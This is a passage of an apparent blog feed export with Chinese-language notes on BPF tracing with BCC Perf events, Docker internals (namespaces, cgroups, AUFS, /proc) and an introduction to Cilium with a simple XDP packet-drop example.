Perf</code>事件数组映射。它们允许你将数据放入与用户空间程序实时同步的环形缓冲区中。当你在BPF程序中收集大量数据，并希望将处理可视化工作转移到用户空间程序时，这是一个理想的选择。这将允许你对表示层进行更多控制，因为在编程能力方面不受BPF虚拟机的限制。你可以找到的大多数BPF跟踪程序的目的是使用<code>Perf</code>事件。</p><p>这里我们将展示如何使用它们提取有关二进制执行的信息，并对这些信息进行分类，以打印系统中执行最多的二进制文件。我们已将此示例分为两个代码块，以便你可以轻松地了解此示例。在第一块中，我们定义BPF程序并将其附加到<code>kprobe</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);1</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">bpf = BPF(text = bpf_source)<span class="number">3</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br></pre></td></tr></table></figure><p>1：使用<code>BPF_PERF_OUTPUT</code>输出声明<code>Perf</code>事件映射。这是BCC提供的用于声明此类映射的宏。我们将此映射命名为<code>events</code>。</p><p>2：在获得内核执行的程序的名称后，将其发送到用户空间进行聚合。我们使用<code>perf_submit</code>来实现这一点。此函数使用我们的新信息更新<code>Perf events</code>映射。</p><p>3：初始化BPF程序并将其附着到<code>kprobe</code>，以便在系统中执行新程序时触发。</p><p>现在我们已经编写了收集系统中执行的所有程序的代码，我们需要在用户空间中聚合它们。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span><span class="number">2</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)<span class="number">3</span></span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:<span class="number">5</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><p>1：声明一个计数器来存储我们的程序信息。我们使用程序的名称作为键，值将是计数器。我们使用<code>aggregate_ programs</code>函数从<code>Perf</code>事件映射中收集数据。在本例中可以看到我们如何使用BCC宏访问映射并从堆栈顶部提取下一个传入数据事件。</p><p>2：增加我们收到具有相同程序名称的事件的次数。</p><p>3：使用函数<code>open_perf_buffer</code>告诉BCC，每次从<code>Perf events</code>映射接收到事件时，它都需要执行<code>aggregate</code>函数程序。</p><p>4：BCC在打开环形缓冲区后轮询事件，直到我们中断此Python程序。等待的时间越长，处理的信息就越多。可以看到我们如何使用<code>perf_buffer_poll</code></p><p>5：使用<code>most_common</code>函数获取计数器和循环中的元素列表，以打印系统中执行次数最多的程序。</p><p><code>perf_events.py</code>完整代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)</span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h3><p>在本章中，我们只触及了使用BPF进行跟踪的表面。Linux内核允许您访问其他工具更难以获取的信息。BPF使此过程更具可预测性，因为它提供了访问此数据的公共接口。在后面的章节中，您将看到更多使用此处描述的一些技术的示例，例如将函数附着到跟踪点。</p><p>在下一章中，我们将展示系统社区在BPF基础上构建的一些工具，用于进行性能分析和跟踪。这些专用工具可以让你访问我们看到的打包格式的大部分信息。这样你就不需要重写已经存在的工具。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一章节&quot;&gt;&lt;a href=&quot;#第一章节&quot; class=&quot;headerlink&quot; title=&quot;第一章节&quot;&gt;&lt;/a&gt;第一章节&lt;/h2&gt;&lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>自己动手写Docker阅读笔记</title>
    <link href="elssm.github.io/2022/04/05/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99Docker%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2022/04/05/自己动手写Docker阅读笔记/</id>
    <published>2022-04-05T08:58:17.000Z</published>
    <updated>2022-05-15T06:12:20.754Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h4><h5 id="concept"><a href="#concept" class="headerlink" title="concept"></a>concept</h5><p><code>Linux Namespace</code>是Kernel的一个功能，它可以隔离一系列的系统资源。例如PID、UserID、Network等。<code>Namespace</code>也可以在一些资源上，将进程隔离起来，这些资源包括进程树、网络接口、挂载点等。</p><p>例如一家公司向外界出售自己的计算资源。但是需要将不同的客户隔离起来。这个时候，<code>Linux Namespace</code>就派上了用场，使用<code>Namespace</code>就可以做到UID级别的隔离，也就是说，可以以UID为n的用户，虚拟化出来一个<code>Namespace</code>，在这个<code>Namespace</code>里面，用户是具有root权限的。但是在真实的物理机器上，他还是那个以UID为n的用户。</p><p>除了<code>User Namespace</code>，PID也是可以被虚拟的。命名空间建立系统的不同视图。从用户的角度来看，每一个命名空间应该像一台单独的Linux计算机一样，有自己的<code>init</code>进程(PID为1)，其他进程的PID依次递增。A和B空间都有PID为1的<code>init</code>进程，子命名空间的进程映射到父命名空间的进程上，父命名空间可以知道每一个子命名空间的运行状态，而子命名空间与子命名空间之间是隔离的。</p><p>如下图所示，进程3在父命名空间中的PID为 3，但是在子命名空间内，它的PID就是1。也就是说用户从子命名空间A内看进程3就像<code>init</code>进程一样，以为这个进程是自己的初始化进程，但是从整个host来看，它其实只是3号进程虚拟化出来的一个空间而己。</p><p><img src="/2022/04/05/自己动手写Docker阅读笔记/1.png" alt="1"></p><p>当前Linux一共实现了6种不同类型的<code>Namespace</code></p><p><img src="/2022/04/05/自己动手写Docker阅读笔记/2.png" alt="2"></p><p><code>Namespace</code>的API主要是用如下3个系统调用</p><ul><li><code>clone()</code>创建新进程。根据系统调用参数来判断哪些类型的<code>Namespace</code>被创建，而且它们的子进程也会被包含到这些<code>Namespace</code>中</li><li><code>unshare()</code>将进程移出某个<code>Namespace</code></li><li><code>setns()</code>将进程加入到<code>Namespace</code>中</li></ul><h5 id="UTS-Namespace"><a href="#UTS-Namespace" class="headerlink" title="UTS Namespace"></a>UTS Namespace</h5><p><code>UTS Namespace</code>主要用来隔离<code>nodename</code>和<code>domainname</code>两个系统标识。在<code>UTS Namespace</code>里面，每个<code>Namespace</code>允许有自己的<code>hostname</code></p><p>输出当前的PID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $$</span><br></pre></td></tr></table></figure><p>查看进程的UTS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readlink /proc/&lt;PID&gt;/ns/uts</span><br></pre></td></tr></table></figure><h5 id="IPC-Namespace"><a href="#IPC-Namespace" class="headerlink" title="IPC Namespace"></a>IPC Namespace</h5><p><code>IPC Namespace</code>用来隔离<code>System V IPC</code>和<code>POSIX message queues</code>。每一个<code>IPC Namespace</code>都有自己的<code>System V IPC</code>和<code>POSIX message queues</code></p><p>查看现有的<code>ipc Message Queues</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipcs -q</span><br></pre></td></tr></table></figure><h5 id="PID-Namespace"><a href="#PID-Namespace" class="headerlink" title="PID Namespace"></a>PID Namespace</h5><p><code>PID Namespace</code>是用来隔离进程ID的。同样一个进程在不同的<code>PID Namespace</code>里可以拥有不同的PID。这样就可以理解，在<code>docker container</code>里面，使用<code>ps-ef</code>经常会发现，在容器 内，前台运行的那个进程PID是1，但是在容器外，使用<code>ps -ef</code>会发现同样的进程却有不同的PID，这就是<code>PID Namespace</code>做的事情</p><p>查看进程树</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree -pl</span><br></pre></td></tr></table></figure><h5 id="Mount-Namespace"><a href="#Mount-Namespace" class="headerlink" title="Mount Namespace"></a>Mount Namespace</h5><p><code>Mount Namespace</code>用来隔离各个进程看到的挂载点视图。在不同<code>Namespace</code>的进程中， 看 到的文件系统层次是不一样的。在<code>Mount Namespace</code>中调用<code>mount()</code>和<code>umount()</code>仅仅只会影响当前<code>Namespace</code>内的文件系统 ，而对全局的文件系统是没有影响的</p><h5 id="User-Namespace"><a href="#User-Namespace" class="headerlink" title="User Namespace"></a>User Namespace</h5><p><code>User Namespace</code>主要是隔离用户的用户组ID。也就是说，一个进程的<code>User ID</code>和<code>Group ID</code>在<code>User Namespace</code>内外可以是不同的。比较常用的是，在宿主机上以一个非root用户运行 创建一个<code>User Namespace</code>， 然后在<code>User Namespace</code>里面却映射成root用户。这意味着， 这个进程在<code>User Namespace</code>里面有root权限，但是在<code>User Namespace</code>外面却没有root的权限。从<code>Linux Kernel 3.8</code>开始，非root进程也可以创建<code>User Namespace</code>，并且此用户在<code>Namespace</code>里面可以被映射成root，且在<code>Namespace</code>内有root权限</p><h5 id="Network-Namespace"><a href="#Network-Namespace" class="headerlink" title="Network Namespace"></a>Network Namespace</h5><p><code>Network Namespace</code>是用来隔离网络设备、IP地址端口等网络栈的<code>Namespace</code>。<code>Network Namespace</code>可以让每个容器拥有自己独立的(虚拟的)网络设备，而且容器内的应用可以绑定到自己的端口，每个<code>Namespace</code>内的端口都不会互相冲突。在宿主机上搭建网桥后，就能很方 便地实现容器之间的通信，而且不同容器上的应用可以使用相同的端口</p><h4 id="Cgroups"><a href="#Cgroups" class="headerlink" title="Cgroups"></a>Cgroups</h4><h5 id="concept-1"><a href="#concept-1" class="headerlink" title="concept"></a>concept</h5><p><code>Namespace</code>技术能够帮助进程隔离出自己单独的空间，但是Docker是怎么限制每个空间的大小，保证它们不会互相争夺呢。这里就用到了<code>Cgroups</code>技术。</p><p><code>Linux Cgroups</code>(Control Groups)提供了对一组进程及将来子进程的资源限制、控制和统计的能力，这些资源包括CPU、内存、存储、网络等。通过<code>Cgroups</code>，可以方便地限制某个进 程的资源占用，并且可以实时地监控进程的监控和统计信息</p><h5 id="Cgroups中的3个组件"><a href="#Cgroups中的3个组件" class="headerlink" title="Cgroups中的3个组件"></a>Cgroups中的3个组件</h5><ul><li><code>cgroup</code>是对进程分组管理的一种机制，一个<code>cgroup</code>包含一组进程，并可以在这个<code>cgroup</code>上增加<code>Linux subsystem</code>的各种参数配置，将一组进程和一组<code>subsystem</code>的系统参数关联起来。</li><li><code>subsystem</code>是一组资源控制的模块，一般包含如下几项<ul><li><code>blkio</code>设置对块设备(比如硬盘)输入输出的访问控制</li><li><code>cpu</code>设置<code>cgroup</code>中进程的<code>CPU</code>被调度的策略</li><li><code>cpuacct</code>可以统计<code>cgroup</code>中进程的<code>CPU</code>占用</li><li><code>cpuset</code>在多核机器上设置<code>cgroup</code>中进程可以使用的<code>CPU</code>和内存(此处内存仅使用于NUMA 架构)</li><li><code>devices</code>控制<code>cgroup</code>中进程对设备的访问</li><li><code>freezer</code>用于挂起(suspend)和恢复(resume)<code>cgroup</code>中的进程</li><li><code>memory</code>用于控制<code>cgroup</code>中进程的内存占用</li><li><code>net_els</code>用于将<code>cgroup</code>中进程产生的网络包分类，以便<code>Linux</code>的<code>tc(traffic controller)</code>可以根据分类区分出来自某个<code>cgroup</code>的包并做限流或监控</li><li><code>net_prio</code>设置<code>cgroup</code>中进程产生的网络流量的优先级</li><li><code>ns</code>这个<code>subsystem</code>比较特殊，它的作用是使<code>cgroup</code>中的进程在新的<code>Namespace</code>中<code>fork</code>新进程<code>CNEWNS</code>时，创建出一个新的<code>cgroup</code>，这个<code>cgroup</code>包含新的<code>Namespace</code>中的进</li></ul></li></ul><p>每个<code>subsystem</code>会关联到定义了相应限制的<code>cgroup</code>上，并对这个<code>cgroup</code>中的进程做相应的限制和控制。</p><ul><li><code>hierarchy</code>的功能是把一组<code>cgroup</code>串成一个树状的结构，一个这样的树便是一个 <code>hierarchy</code>，通过这种树状结构，<code>Cgroups</code>可以做到继承。比如，系统对一组定时的任务进程通过<code>cgroup1</code>限制了CPU的使用率，然后其中有一个定时<code>dump</code>日志的进程还需要限制磁盘 IO，为了避免限制了磁盘IO之后影响到其他进程，就可以创建<code>cgroup2</code>，使其继承于 <code>cgroup1</code>并限制磁盘的IO，这样<code>cgroup2</code>便继承了<code>cgroup1</code>中对<code>CPU</code>使用率的限制，并且增加了磁盘IO的限制而不影响到<code>cgroup1</code>中的其他进程</li></ul><h5 id="三个组件之间的关系"><a href="#三个组件之间的关系" class="headerlink" title="三个组件之间的关系"></a>三个组件之间的关系</h5><ul><li>系统在创建了新的<code>hierarchy</code>之后，系统中所有的进程都会加入这个<code>hierarchy</code>的<code>cgroup</code>根节点，这个<code>cgroup</code>根节点是<code>hierarchy</code>默认创建的</li><li>一个<code>subsystem</code>只能附加到一个<code>hierarchy</code>上面</li><li>一个<code>hierarchy</code>可以附加多个<code>subsystem</code></li><li>一个进程可以作为多个<code>cgroup</code>的成员，但是这些<code>cgroup</code>必须在不同的<code>hierarchy</code>中</li><li>一个进程<code>fork</code>出子进程时，子进程是和父进程在同一个<code>cgroup</code>中的，也可以根据需要将其移动到其他<code>cgroup</code>中</li></ul><h5 id="Docker是如何使用Cgroups的"><a href="#Docker是如何使用Cgroups的" class="headerlink" title="Docker是如何使用Cgroups的"></a>Docker是如何使用Cgroups的</h5><p>设置内存限制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -m 128m ubuntu</span><br></pre></td></tr></table></figure><p>docker会为每个容器在系统的<code>hierarchy</code>种创建<code>cgroup</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /sys/fs/cgroup/memory/docker/&lt;container_id&gt;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat memory.limit_in_bytes #查看cgroup的内存限制</span><br><span class="line">cat memory.usage_in_bytes #查看cgroup中进程所使用的内存大小</span><br></pre></td></tr></table></figure><p>可以看到，Docker通过为每个容器创建<code>cgroup</code>，并通过<code>cgroup</code>去配置资源限制和资源监控</p><h4 id="Union-File-System"><a href="#Union-File-System" class="headerlink" title="Union File System"></a>Union File System</h4><h5 id="concept-2"><a href="#concept-2" class="headerlink" title="concept"></a>concept</h5><p><code>Union File System</code>简称<code>UnionFS</code>，是一种位<code>Linux</code>、<code>FreeBSD</code>和<code>NetBSD</code>操作系统设计的，把其他文件系统联合到一个联合挂载点的文件系统服务。它使用<code>branch</code>把不同文件系统的文件和目录”透明地”覆盖，形成一个单一一致的文件系统。这些<code>branch</code>或者是<code>read-only</code>的，或者是<code>read-write</code>的，所以当对这个虚拟后的联合文件系统进行写操作的时候，系统是真正写到了一个新的文件中。看起来这个虚拟后的联合文件系统是可以对任何文件进行操作的，但是其实它并没有改变原来的文件，这是因为<code>unionfs</code>用到了一个重要的资源管理技术，叫写时复制。</p><p>写时复制(copy-on-write，简称CoW)，也叫隐式共享，是一种对可修改资源实现高效复制的资源管理技术。它的思想是，如果一个资源是重复的，但没有任何修改，这时并不需要立即创建一个新的资源，这个资源可以被新旧实例共享。创建新资源发生在第一次写操作，也就是对资源进行修改的时候。通过这种资源共享的方式，可以显著地减少未修改资源复制带来的消耗，但是也会在进行资源修改时增加小部分的开销</p><h5 id="AUFS"><a href="#AUFS" class="headerlink" title="AUFS"></a>AUFS</h5><p><code>AUFS</code>，英文全称是<code>Advanced Multi-Layered Unification Filesystem</code>，曾经也叫<code>Acronym Multi-Layered Unification Filesystem</code>、<code>Another Multi-Layered Unification Filesystem</code>。 <code>AUFS</code>完全重写了早期的<code>UnionFS 1.x</code>，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。<code>AUFS</code>的一些实现已经被纳入<code>UnionFS 2.x</code>版本</p><h5 id="Docker是如何使用AUFS的"><a href="#Docker是如何使用AUFS的" class="headerlink" title="Docker是如何使用AUFS的"></a>Docker是如何使用AUFS的</h5><p><code>AUFS</code>是Docker选用的第一种存储驱动。<code>AUFS</code>具有快速启动容器、高效利用存储和内存的优点。直到现在，<code>AUFS</code>仍然是Docker支持的一种存储驱动类型。</p><h6 id="Image-layer和AUFS"><a href="#Image-layer和AUFS" class="headerlink" title="Image layer和AUFS"></a>Image layer和AUFS</h6><p>每一个<code>Docker image</code>都是由一系列<code>read-only layer</code>组成的，<code>image layer</code>的内容都存储在<code>Docker hosts filesystem</code>的<code>/var/lib/docker/aufs/diff</code>目录下。而<code>/var/lib/docker/aufs/layers</code>目录，则存储着<code>image layer</code>如何堆栈这些<code>layer</code>的<code>metadata</code></p><h6 id="Container-layer和AUFS"><a href="#Container-layer和AUFS" class="headerlink" title="Container layer和AUFS"></a>Container layer和AUFS</h6><p>Docker使用<code>AUFS</code>的<code>CoW</code>技术来实现<code>image layer</code>共享和减少磁盘空间占用。<code>CoW</code>意味着一旦某个文件只有很小的部分有改动， <code>AUFS</code>也需要复制整个文件。这种设计会对容器性能产生一定的影响，尤其是在待复制的文件很大，或者位于很多<code>image layer</code>下方，又或者<code>AUFS</code>需要深度搜索目录结构树的时候。不过也不用过度担心，对于一个容器而言，每个<code>image layer</code>最多只需要复制一次。后续的改动都会在第一次拷贝的<code>container layer</code>上进行。</p><p>启动一个<code>container</code>的时候，Docker会为其创建一个<code>read-only</code>的<code>init layer</code>，用来存储与这个容器内环境相关的内容，Docker还会为其创建一个<code>read-write</code>的<code>layer</code>来执行所有写操作。</p><p><code>container layer</code>的<code>mount</code>目录也是<code>/var/lib/docker/aufs/mnt</code>。<code>container</code>的<code>metadata</code>和配置文件都存放在<code>/var/lib/docker/containers/&lt;container-id&gt;</code>目录中。<code>container</code>的<code>read-write layer</code>存储在<code>/var/lib/docker/aufs/diff/</code>目录下。即使容器停止，这个可读写层仍然存在，因而重启容器不会丢失数据，只有当一个容器被删除的时候，这个可读写层才会一起删除。</p><p>最后，讲一下<code>AUFS</code>如何为<code>container</code>删除一个文件。如果要删除file1时，<code>AUFS</code>会在<code>container</code> 的<code>read-write</code>层生成一个<code>.wh.file1</code>的文件来隐藏所有<code>read-only</code>层的file1文件。</p><h4 id="Linux-proc介绍"><a href="#Linux-proc介绍" class="headerlink" title="Linux proc介绍"></a>Linux proc介绍</h4><p>Linux下的<code>/proc</code>文件系统是由内核提供的，它其实不是一个真正的文件系统，只包含了系统运行时的信息(比如系统内存、mount设备信息、一些硬件配置等)，只存在于内存中，而不占用外存空间。它以文件系统的形式，为访问内核数据的操作提供接口。</p><p>当遍历<code>/proc</code>目录时，会发现很多数字，这些都是为每个进程创建的空间。</p><p>一些具体的文件信息如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/proc/N PID为N的进程信息</span><br><span class="line">/proc/N/cmdline 进程启动命令</span><br><span class="line">/proc/N/cwd链接到进程当前工作目录</span><br><span class="line">/proc/N/environ 进程环境变量列表</span><br><span class="line">/proc/N/exe 链接到进程的执行命令文件</span><br><span class="line">/proc/N/fd 包含进程相关的所有文件描述符</span><br><span class="line">/proc/N/maps 与进程相关的内存映射信息</span><br><span class="line">/proc/N/mem 指代进程持有的内存，不可读</span><br><span class="line">/proc/N/root 链接到进程的根目录</span><br><span class="line">/proc/N/stat 进程的状态</span><br><span class="line">/proc/N/statm 进程使用的内存状态</span><br><span class="line">/proc/N/status 进程状态信息，比stat/statm更具可读性</span><br><span class="line">/proc/self/链接到当前正在运行的进程</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Namespace&quot;&gt;&lt;a href=&quot;#Namespace&quot; class=&quot;headerlink&quot; title=&quot;Namespace&quot;&gt;&lt;/a&gt;Namespace&lt;/h4&gt;&lt;h5 id=&quot;concept&quot;&gt;&lt;a href=&quot;#concept&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>略知一二之Cilium</title>
    <link href="elssm.github.io/2022/03/18/%E7%95%A5%E7%9F%A5%E4%B8%80%E4%BA%8C%E4%B9%8BCilium/"/>
    <id>elssm.github.io/2022/03/18/略知一二之Cilium/</id>
    <published>2022-03-18T10:06:24.000Z</published>
    <updated>2022-03-18T10:13:18.021Z</updated>
    
    <content type="html"><![CDATA[<h4 id="What-is-Cilium？"><a href="#What-is-Cilium？" class="headerlink" title="What is Cilium？"></a>What is Cilium？</h4><p>Cilium is open source software for transparently securing the network connectivity between application services deployed using Linux container management platforms like Docker and Kubernetes.</p><p>At the foundation of Cilium is a new Linux kernel technology called BPF, which enables the dynamic insertion of powerful security visibility and control logic within Linux itself. Because BPF runs inside the Linux kernel, Cilium security policies can be applied and updated without any changes to the application code or container configuration.</p><h4 id="Why-Cilium？"><a href="#Why-Cilium？" class="headerlink" title="Why Cilium？"></a>Why Cilium？</h4><p><img src="/2022/03/18/略知一二之Cilium/1.png" alt="1"></p><h4 id="eBPF-Architecture"><a href="#eBPF-Architecture" class="headerlink" title="eBPF Architecture"></a>eBPF Architecture</h4><p><img src="/2022/03/18/略知一二之Cilium/2.png" alt="2"></p><h4 id="XDP"><a href="#XDP" class="headerlink" title="XDP"></a>XDP</h4><p>Cilium方案中大量使用了XDP、TC等网络相关的BPF hook，以实现高性能的网络RX和TX。</p><p>XDP全称为<strong>eXpress Data Path</strong>，是Linux内核网络栈的最底层。它只存在于RX路径上，允许在网络设备驱动内部网络堆栈中数据来源最早的地方进行数据包处理，在特定模式下可以在操作系统分配内存（<strong>skb</strong>）之前就已经完成处理。</p><p>尝试写一个xdp代码，名为<code>xdp-example.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __section</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __section(NAME) \</span></span><br><span class="line">   __attribute__((section(NAME),used))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"prog"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xdp_drop</span><span class="params">(struct xdp_md *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> __license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>查看整个编译过程都做了哪些事情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# clang -ccc-print-phases -o2 -Wall -target bpf -c xdp-example.c -o xdp-example.o</span><br><span class="line">         +- 0: input, "xdp-example.c", c//输入</span><br><span class="line">      +- 1: preprocessor, &#123;0&#125;, cpp-output//预处理</span><br><span class="line">   +- 2: compiler, &#123;1&#125;, ir//编译</span><br><span class="line">+- 3: backend, &#123;2&#125;, assembler//汇编</span><br><span class="line">4: assembler, &#123;3&#125;, object//生成目标代码</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# file xdp-example.o</span><br><span class="line">xdp-example.o: ELF 64-bit LSB relocatable, eBPF, version 1 (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>加载xdp程序</p><p>首先查看主机的网卡设备列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 